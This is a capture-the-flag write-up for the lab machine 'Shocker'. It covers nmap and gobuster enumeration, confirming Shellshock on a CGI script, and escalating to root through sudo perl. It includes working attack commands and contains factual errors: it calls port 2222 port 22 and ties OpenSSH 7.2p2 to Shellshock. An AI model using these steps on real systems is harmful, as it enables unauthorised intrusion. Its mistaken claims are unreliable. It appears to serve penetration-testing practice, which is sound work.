MACHINE IP:10.10.10.56
MACHINE NAME: Shocker

#Recon and Enum

````
First off we run an nmap scan, nmap -sC -sV -T4 10.10.10.56

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 03:41 EDT
Nmap scan report for 10.10.10.56
Host is up (0.57s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.27 seconds


Two ports open, 22 and 80.

Let's have a closer look at port 22;
-ubuntu verision 4ubuntu2.2 is running. This tells us of the last update applied to this particular version of open ssh.
-openssh 7.2p2

Openssh 7.2p2 was vulnerable to shellshock vulnerability before patching. Let's take a closer look here if out target system is still vulnerable.

side note: From the Apache version leaked in the nmap scan, it is possible to identify which package of ubuntu is running on this box: packages.ubuntu.com, all you have to do is look through the various packages for an exact version number of apache, 2.4.18.
````
#Enum Port 80

````
For port 80, we'll use gobuster to try and get some more information.

/cgi-bin/ seems interesting but it has a status code of 403.

We'll now specify this exact url in gobuster and add some common extensions with the -x flag.

gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,pl

/user.sh directory detected.
Navigating to this path sends us a file back, which upon openning, seems like it executed some bash.

````
#shellshock

````
Let's try this first using the nmap nse script.

nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56

And voila! nse confirms that this server is vulnerable to shellshcok andexploitable.

using metasploit: auxiliary/scanner/http/apache_mod_cgi_bash_env

python3 -c "import pty; pty.spawn('/bin/bash');"

running sudo -l, we notice that user shelly can prform perl commands as root without needing the password. We therefore perform a perl privesct.

sudo perl -e 'exec "/bin/bash";'

````
